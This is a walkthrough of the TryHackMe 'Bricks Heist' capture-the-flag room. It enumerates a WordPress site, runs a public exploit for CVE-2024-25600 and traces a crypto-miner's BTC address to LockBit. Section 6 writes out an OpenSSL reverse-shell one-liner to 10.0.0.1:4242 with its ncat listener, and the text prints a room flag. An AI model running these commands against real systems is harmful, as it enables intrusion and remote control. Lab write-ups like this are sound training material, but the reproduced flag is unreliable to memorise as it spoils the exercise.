---
title: "TryHackMe: Bricks Heist"
date: 2025-12-08
categories: [CTFs, TryHackMe, Easy]
tags: [TryHackMe, TryHackMe Easy]
---

Machine by [tryhackme](https://tryhackme.com/p/tryhackme)

Tryhackme [link](https://tryhackme.com/r/room/tryhack3mbricksheist)

---

## Tools Used:<!-- omit in toc -->

- Kali Linux
- NMAP
- dirb
- wpscan
- git
- python 3
- pip


---

### 1. NMAP scan

Using `nmap -sV -p-5000 IP` we will enumerate all the first 5000 active ports and grab all the service banners.

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_01.png)

Visiting the http website we can see that there is an error 405, wich means the url we are trying to access is blocked.

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_02.png)

Since there is a 443 port listening i've tried to visit the https site, this is what we can see, nothing special on the source code and not telling us much:

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_03.png)


### 2. dirb

Since we can access the website with https, using dirb tells us there is a wordpress installation because of the `wp-admin` url:

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_04.png)


### 3. wpscan

Using wpscan we can see that there are three vulnerabilities, one of them is an cross-site scripting, and two Remote code execution:

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_05.png)

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_06.png)

### 4. Exploit preparation

After looking for the RCE vulnerability i've found this [github](https://github.com/Chocapikk/CVE-2024-25600), we'll clone it:

Install the requirements with pip:

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_07.png)

<br>

And execute with `python3 exploit.py --url https://bricks.thm/`

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_08.png)

<br>

### 5. First flag

Once inside we can see we're inside the `/data/www/default` directory, inside there's the first flag `THM{fl46_650c844110baced87e1606453b93f22a}`

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_09.png)

<br>

I've tried to get the root db password by listing the contents of `wp-config.php`, but the password field is protected by the `lamp.sh` script

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_10.png)

<br>

### 6. Reverse Shell

For comodity i'll get a reverse shell running with open-ssl:

``` mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s ```

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_11.png)

The listener was:
`ncat --ssl -vv -l -p 4242`

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_12.png)

### 7. Service analysis

We can list the running proceses with `systemctl --type=service --state=running` and `ubuntu.service` looks quite suspicious:

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_13.png)

<br>

With `systemctl cat ubuntu.service` we can see asociated info with the service, the task that's being called is `nm-inet-dialog` wich is the name of the process.

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_14.png)

<br>

If we list the contents of the parent's folder of the process there is only one file with read permissions `inet.conf`:

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_15.png)

<br>

### 8. BTC address

As we can see we've found the process that's related to the miner, now we need to figure out the crypto address:

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_16.png)

<br>

With [dencode.com](https://dencode.com/string) we'll decode the string three times:

The first conversión is to Hex:

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_17.png)

<br>

Then to Base64:

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_18.png)

<br>

And again Base64:

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_19.png)

The string is repeated and if we cut it in half we get the BTC address: `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`


With [dencode.com](https://dencode.com/string)

### 9. BTC address owner

First we'll lookup the address on [blockchain.com](https://www.blockchain.com/explorer/addresses/btc/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa)

The first transaction was from `bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r`

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_20.png)

<br>

Afeter a google search we can see the next article:

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_21.png)

<br>

And the address is related to `LockBit`:

![](/assets/img/ctf/tryhackme/easy/bricksheist/bricksheist_22.png)
